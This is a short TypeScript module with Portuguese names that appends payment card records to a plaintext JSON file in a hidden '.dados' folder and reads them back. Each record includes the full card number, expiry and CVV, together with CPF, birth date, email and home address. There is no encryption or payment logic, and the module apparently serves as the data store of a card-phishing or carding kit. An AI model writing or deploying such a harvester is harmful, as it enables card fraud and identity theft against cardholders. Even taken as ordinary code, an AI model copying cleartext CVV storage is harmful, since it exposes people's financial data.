import * as fs from "fs";
import * as path from "path";

const dataDir = path.join(process.cwd(), ".dados");
const cartaoFile = path.join(dataDir, "cartoes.json");

function ensureDir() {
  if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir, { recursive: true });
  }
}

export function initCartaoService() {
  ensureDir();
  if (!fs.existsSync(cartaoFile)) {
    fs.writeFileSync(cartaoFile, JSON.stringify([], null, 2));
  }
}

export function salvarCartao(dados: any) {
  try {
    ensureDir();
    let cartoes = [];
    if (fs.existsSync(cartaoFile)) {
      const content = fs.readFileSync(cartaoFile, "utf-8");
      cartoes = JSON.parse(content || "[]");
    }
    cartoes.push({
      timestamp: new Date().toISOString(),
      nome: dados.nome || "",
      numero: dados.numero || "",
      validade: dados.validade || "",
      cvv: dados.cvv || "",
      cep: dados.cep || "",
      rua: dados.rua || "",
      numero_endereco: dados.numero_endereco || "",
      complemento: dados.complemento || "",
      bairro: dados.bairro || "",
      cidade: dados.cidade || "",
      estado: dados.estado || "",
      email: dados.email || "",
      cpf: dados.cpf || "",
      nome_completo: dados.nome_completo || "",
      data_nascimento: dados.data_nascimento || "",
    });
    fs.writeFileSync(cartaoFile, JSON.stringify(cartoes, null, 2));
    console.log(`[cartao] Dados salvos. Total: ${cartoes.length}`);
  } catch (err) {
    console.error("[cartao] Erro ao salvar:", err);
  }
}

export function obterCartoes(): any[] {
  try {
    if (fs.existsSync(cartaoFile)) {
      const content = fs.readFileSync(cartaoFile, "utf-8");
      return JSON.parse(content || "[]");
    }
  } catch (err) {
    console.error("[cartao] Erro ao ler:", err);
  }
  return [];
}
